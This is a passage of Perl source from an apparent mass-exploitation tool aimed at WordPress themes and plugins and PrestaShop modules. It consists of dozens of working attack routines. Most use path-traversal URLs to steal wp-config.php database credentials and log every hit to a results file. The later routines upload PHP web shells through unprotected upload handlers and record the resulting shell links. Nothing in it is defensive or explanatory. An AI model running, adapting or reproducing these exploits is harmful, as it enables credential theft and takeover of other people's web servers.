	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	####################################################################################################

	sub Parallelus(){             print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Parallelus-Salutation ............. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/parallelus-salutation/framework/utilities/download/getfile.php?file=..%2F..%2F..%2F..%2F..%2F..%2Fwp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	####################################################################################################

	
	
	sub RedSteel(){            print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"RedSteel Exploiting ......... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/RedSteel/download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable ";print color('bold white'),"\n";
    print color('reset');
	}}
	####################################################################################################

	
	
	sub Revsliderss(){             print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Revslider Exploiting ........ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	####################################################################################################

	
	sub S3bubble(){             print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"S3bubble-amazon-s3-html-5 ......... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/s3bubble-amazon-s3-html-5-video-with-adverts/assets/plugins/ultimate/content/downloader.php?name=wp-config.php&path=../../../../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	sub SMWF(){             print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"SMWF Exploiting ............. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/SMWF/inc/download.php?file=../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	sub TheLoft(){            print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"TheLoft Exploiting .......... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/TheLoft/download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable ";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	sub Trinity(){            print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Trinity Exploiting .......... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/trinity/lib/scripts/download.php?file=../../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vulnerable ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable ";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
	
####################################################################################################
	
	sub Urbancity(){             print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Urbancity Exploiting ........ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/urbancity/lib/scripts/download.php?file=../../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable ";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	
	sub Yakimabait(){            print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
  print color('bold white'),"Yakimabait Exploiting ....... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/yakimabait/download.php?file=./wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	####################################################################################################

	
	
	sub Membership(){          print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
  print color('bold white'),"Membership Simplified v1.58 ....... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
		sub FileManagerwp(){             print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Wp-FileManager Exploiting ... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/wp-filemanager/incl/libfile.php?&path=../../&filename=wp-config.php&action=download";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
			sub Googlemp3(){             print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Google-mp3-audio-player ........... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/google-mp3-audio-player/direct_download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
####################################################################################################
	
	
	
				sub Justifiedim(){           print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
  print color('bold white'),"Justified-image-grid 1 ............ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/wamp/www/wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
				sub Justified2(){           print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Justified-image-grid 2 ............ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/justified-image-grid/download.php?file=file:///C:/xampp/htdocs/wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
				sub Justified3(){            print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Justified-image-grid 3 ............ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/justified-image-grid/download.php?file=file:///var/www/wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	
				sub Aspose(){            print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Aspose-cloud-ebook-generator ...... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/aspose-cloud-ebook-generator/aspose_posts_exporter_download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	

	####################################################################################################

	
	
					sub Asposedoc(){           print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
  print color('bold white'),"Aspose-doc-exporter ............... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/aspose-doc-exporter/aspose_doc_exporter_download.php?file=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
						sub MiwoFTP(){             print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"MiwoFTP 1.0.5  1 .................. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&item=wp-config.php&order=name&srt=yes";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
						sub MiwoFTP2(){          print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"MiwoFTP 1.0.5  2 .................. ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Vuln ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}

####################################################################################################

	
	
							sub miniaudioplayer(){          print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Wp-miniaudioplayer ................ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/wp-miniaudioplayer/map_download.php?fileurl=../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
								sub Ypotheme(){           print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
   print color('bold white'),"Ypo-theme Exploiting ........ ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/themes/ypo-theme/download.php?download=..%2F..%2F..%2F..%2Fwp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
	
	
									sub Media14(){           print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"N-Media 1.4 Exploiting ...... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/website-contact-form-with-file-upload/config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	
	
	####################################################################################################

										sub wpmon(){  print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Wp-mon Exploiting ........... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/wp-mon/assets/download.php?type=octet/stream&path=../../../../&name=wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "VULN ";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
	}}
	
	####################################################################################################

	
											sub mapprolbs(){ print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";
 print color('bold white'),"Ibs-mappro Exploiting ....... ";
$uaa = LWP::UserAgent->new(keep_alive => 1);
$uaa->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$uaa->timeout (1);
my $exploitblog = "$site/wp-content/plugins/ibs-mappro/lib/download.php?file=../../../../wp-config.php";
my $checkblog = $uaa->get("$exploitblog")->content;
if($checkblog =~ m/DB_NAME/g) {
    print color('bold green');
    print "Success";print color('bold white'),"\n";
	print color('reset');
open(BEN,">>Result/Joomla_Config.txt");
print BEN "$exploitblog\n";
close(BEN);
}else{
    print color('bold red');
    print "Not Vulnerable";print color('bold white'),"\n";
    print color('reset');
}
}

################ cubed #####################
sub cubed(){
my $cubedurl = "$site/wp-content/themes/cubed_v1.2/functions/upload-handler.php";
my $response = $ua->post($cubedurl, Content_Type => 'multipart/form-data', Content => [uploadfile => ["Kadd3chy.php"]]);
$cubedup="$site/wp-content/uploads/$year/$month/Kadd3chy.php";
my $checkcubed = $ua->get("$cubedup")->content;

if($checkcubed =~/Kadd3chy/) {
print item(),"Cubed";
print color('bold white')," ............................. ";
print color('bold green'),"Vulnerable\n";
print item(),"Done Shell Uploaded\n";
print color('bold white'),"  [Here] => $cubedup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$cubedup\n";
close (TEXT);
}else{
print item(),"Cubed";
print color('bold white')," ............................. ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ RightNow #####################
sub RightNow(){
my $RightNowurl = "$site/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php";
my $response = $ua->post($RightNowurl, Content_Type => 'multipart/form-data', Content => [Filedata => ["XAttacker.php"]]);
$RightNowup="$site/wp-content/uploads/settingsimages/XAttacker.php?X=Attacker";
my $checkRightNow = $ua->get("$RightNowup")->content;

if($checkRightNow =~/Kadd3chy/) {
print item(),"Rightnow Theme";
print color('bold white')," .................... ";
print color('bold white'),"";
print color('bold green'),"Vulnerable";
print color('bold white'),"\n";
print item(),"Done Shell Uploaded\n";
print color('bold white'),"  [Here] => $RightNowup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$RightNowup\n";
close (TEXT);
}else{
print item(),"Rightnow Theme";
print color('bold white')," .................... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ konzept #####################
sub konzept(){
my $url = "$site/wp-content/themes/konzept/includes/uploadify/upload.php";
my $response = $ua->post($url, Content_Type => "form-data", Content => [file => ["Kadd3chy.jpg"], name => "Kadd3chy.php"]);

$up="$site/wp-content/themes/konzept/includes/uploadify/uploads/Kadd3chy.php";

$checkup = $ua->get("$up")->content;
if($checkup =~/Kadd3chy/) {
print item(),"Konzept";
print color('bold white')," ........................... ";
print color('bold green'),"Vulnerable\n";
print item(),"Done Shell Uploaded\n";
print color('bold white'),"  [Here] => $up\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$up\n";
close (TEXT);
}else{
print item(),"Konzept";
print color('bold white')," ........................... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ omni-secure-files #####################
sub omnisecurefiles(){
my $url = "$site/wp-content/plugins/omni-secure-files/plupload/examples/upload.php";
my $response = $ua->post($url, Content_Type => "form-data", Content => [file => ["XAttacker.php"], name => "XAttacker.php"]);

$up="$site/wp-content/plugins/omni-secure-files/plupload/examples/uploads/XAttacker.php?X=Attacker";

$checkup = $ua->get("$up")->content;
if($checkup =~/X Attacker/) {
print item(),"Omni Secure Files";
print color('bold white')," ................. ";
print color('bold green'),"VULN\n";
print item(),"Shell Uploaded Successfully\n";
print color('bold white'),"  [Link] => $up\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$up\n";
close (TEXT);
}else{
print item(),"Omni Secure Files";
print color('bold white')," ................. ";
print color('bold red'),"NOt VULN\n";
}
}

################ pitchprint #####################
sub pitchprint(){
my $url = "$site/wp-content/plugins/pitchprint/uploader/";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => ['files[]' => ["Kadd3chy.php"]]);
$up="$site/wp-content/plugins/pitchprint/uploader/files/Kadd3chy.php";
my $check = $ua->get("$up")->content;

if($check =~/X Attacker/) {
print item(),"Pitchprint";
print color('bold white')," ........................ ";
print color('bold white'),"";
print color('bold green'),"Vulnerable";
print color('bold white'),"\n";
print item(),"Done Shell Uploaded\n";
print color('bold white'),"  [Here] => $up\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$up\n";
close (TEXT);
}else{
print item(),"Pitchprint";
print color('bold white')," ........................ ";
print color('bold red'),"Not Vulnerable\n";}
}

################ satoshi #####################
sub satoshi(){
my $url = "$site/wp-content/themes/satoshi/upload-file.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [uploadfile => ["Kadd3chy.php"]]);
$up="$site/wp-content/satoshi/images/Kadd3chy.php";
my $check = $ua->get("$up")->content;

if($check =~/kadd3chy/) {
print item(),"Satoshi";
print color('bold white')," ........................... ";
print color('bold white'),"";
print color('bold green'),"Vulnerable";
print color('bold white'),"\n";
print item(),"Done Shell Uploaded\n";
print color('bold white'),"  [Here] => $up\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$up\n";
close (TEXT);
}else{
print item(),"Satoshi";
print color('bold white')," ........................... ";
print color('bold red'),"Not Vulnerable\n";}
}

################ pinboart #####################
sub pinboard(){
my $url = "$site/wp-content/themes/pinboard/themify/themify-ajax.php?upload=1";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [Filedata => ["Kadd3chy.php"]]);
$up="$site/wp-content/themes/pinboard/uploads/Kadd3chy.php";
my $check = $ua->get("$up")->content;

if($check =~/X Attacker/) {
print item(),"Pinboard";
print color('bold white')," .......................... ";
print color('bold white'),"";
print color('bold green'),"Vulnerable";
print color('bold white'),"\n";
print item(),"Done Shell Uploaded\n";
print color('bold white'),"  [Here] => $up\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$up\n";
close (TEXT);
}else{
print item(),"Pinboard";
print color('bold white')," .......................... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ barclaycart #####################
sub barclaycart(){
my $url = "$site/wp-content/plugins/barclaycart/uploadify/uploadify.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [Filedata => ["Kadd3chy.php"]]);
$up="$site/wp-content/plugins/barclaycart/uploadify/Kadd3chy.php";
my $check = $ua->get("$up")->content;

if($check =~/X Attacker/) {
print item(),"Barclaycart";
print color('bold white')," ....................... ";
print color('bold white'),"";
print color('bold green'),"Vulnerable";
print color('bold white'),"\n";
print item(),"Done Shell Uploaded\n";
print color('bold white'),"  [Here] => $up\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$up\n";
close (TEXT);
}else{
print item(),"Barclaycart";
print color('bold white')," ....................... ";
print color('bold red'),"Not Vulnerable\n";}
}

####################################################################################################

######################################################
#################### PrestaShoP ######################
######################################################

################ columnadverts #####################
sub columnadverts(){
my $url = "$site/modules/columnadverts/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Kadd3chy.php"],]);

$columnadvertsup="$site/modules/columnadverts/slides/Kadd3chy.php";

my $checkcolumnadverts = $ua->get("$columnadvertsup")->content;
if($checkcolumnadverts =~/Kadd3chy/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"columnadverts";
print color('bold white')," Exploiting .. ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $columnadvertsup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$columnadvertsup\n";
close (TEXT);
}else{
print color('bold white'),"columnadverts";
print color('bold white')," Exploiting .. ";
print color('bold red'),"Not Vulnerable\n";
}
}


################ soopamobile #####################
sub soopamobile(){
my $url = "$site/modules/soopamobile/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Kadd3chy.php"],]);

$soopamobileup="$site/modules/soopamobile/slides/Kadd3chy.php";

my $checksoopamobile = $ua->get("$soopamobileup")->content;
if($checksoopamobile =~/Kadd3chy/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"soopamobile";
print color('bold white')," Exploiting ...... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $soopamobileup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$soopamobileup\n";
close (TEXT);
}else{
print color('bold white'),"soopamobile";
print color('bold white')," Exploiting ...... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ soopabanners #####################
sub soopabanners(){
my $url = "$site/modules/soopabanners/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Kadd3chy.php"],]);
$soopabannersup="$site/modules/soopabanners/slides/Kadd3chy.php";
my $checksoopabanners = $ua->get("$soopabannersup")->content;
if($checksoopabanners =~/Kadd3chy/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"soopabanners";
print color('bold white')," Exploiting ..... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $soopabannersup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$soopabannersup\n";
close (TEXT);
}else{
print color('bold white'),"soopabanners";
print color('bold white')," Exploiting ..... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ vtermslideshow #####################
sub vtermslideshow(){
my $url = "$site/modules/vtermslideshow/uploadimage.php";
my $response = $ua->post($url, Content_Type => 'multipart/form-data', Content => [userfile => ["Kadd3chy.php"],]);

$vtermslideshowup="$site/modules/vtermslideshow/slides/Kadd3chy.php";

my $checkvtermslideshow = $ua->get("$vtermslideshowup")->content;
if($checkvtermslideshow =~/Kadd3chy/) {
print color('bold red'),"[";print color('bold green'),"+";print color('bold red'),"] ";

print color('bold white'),"Vtermslideshow";
print color('bold white')," Exploiting ... ";
print color('bold green'),"Vulnerable\n";
print color('bold white'),"Done Shell Uploaded\n";
print color('bold white'),"  Shell Link => $vtermslideshowup\n";
open (TEXT, '>>Result/Shells.txt');
print TEXT "$vtermslideshowup\n";
close (TEXT);
}else{
print color('bold white'),"Vtermslideshow";
print color('bold white')," Exploiting ... ";
print color('bold red'),"Not Vulnerable\n";
}
}

################ simpleslideshow #####################
